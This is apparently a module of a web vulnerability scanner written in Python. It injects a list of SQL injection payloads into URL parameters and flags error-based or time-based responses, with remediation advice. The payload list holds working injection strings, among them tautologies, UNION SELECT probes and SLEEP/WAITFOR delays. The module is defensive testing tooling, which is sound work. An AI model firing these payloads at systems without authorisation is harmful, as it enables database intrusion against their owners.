import re
import httpx
from modules.scanner.base_check import BaseCheck, CheckResult


SQLI_VARIANTS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' AND 1=1--",
    "' AND 1=2--",
    "1' OR '1'='1",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1' ORDER BY 100--",
    "1' UNION SELECT NULL--",
    "1' AND SLEEP(5)--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' OR SLEEP(5)='",
    "1' AND 1=1 UNION SELECT NULL--",
    "1' AND 1=2 UNION SELECT NULL--",
    "' OR '1'='1' --",
    "' OR 1=1--",
]

SQLI_ERROR_PATTERNS = [
    (r"you have an error in your sql syntax", "MySQL"),
    (r"ORA-\d{5}", "Oracle"),
    (r"pg_query\(\):.*failed", "PostgreSQL"),
    (r"Microsoft OLE DB.*SQL Server", "MSSQL"),
    (r"SQLite3::", "SQLite"),
    (r"Unclosed quotation mark", "MSSQL"),
]


class SqliVariantsCheck(BaseCheck):
    name = "active_sqli_variants"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        async with httpx.AsyncClient(verify=False, timeout=15) as client:
            for param in target_params:
                for payload in SQLI_VARIANTS:
                    modified = self._inject_payload(base_request, param, payload)
                    try:
                        resp = await client.request(**modified)
                        for pattern, db_type in SQLI_ERROR_PATTERNS:
                            if re.search(pattern, resp.text, re.IGNORECASE):
                                results.append(CheckResult(
                                    triggered=True,
                                    severity="high",
                                    title=f"SQL injection variant detected ({db_type})",
                                    description=f"Parameter '{param}' is vulnerable to error-based SQL injection.",
                                    evidence=f"Payload: {payload}\nDatabase: {db_type}",
                                    remediation="Use parameterised queries / prepared statements.",
                                    cwe="CWE-89",
                                ))
                    except httpx.TimeoutException:
                        if "SLEEP" in payload or "WAITFOR" in payload:
                            results.append(CheckResult(
                                triggered=True,
                                severity="high",
                                title="Possible blind time-based SQL injection",
                                description=f"Parameter '{param}' caused a timeout.",
                                evidence=f"Payload: {payload}",
                                remediation="Use parameterised queries.",
                                cwe="CWE-89",
                            ))
                    except Exception:
                        continue
        return results

    def _inject_payload(self, base: dict, param: str, payload: str) -> dict:
        import copy
        import urllib.parse
        req = copy.deepcopy(base)
        parsed = urllib.parse.urlparse(req["url"])
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = payload
        req["url"] = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
        return req
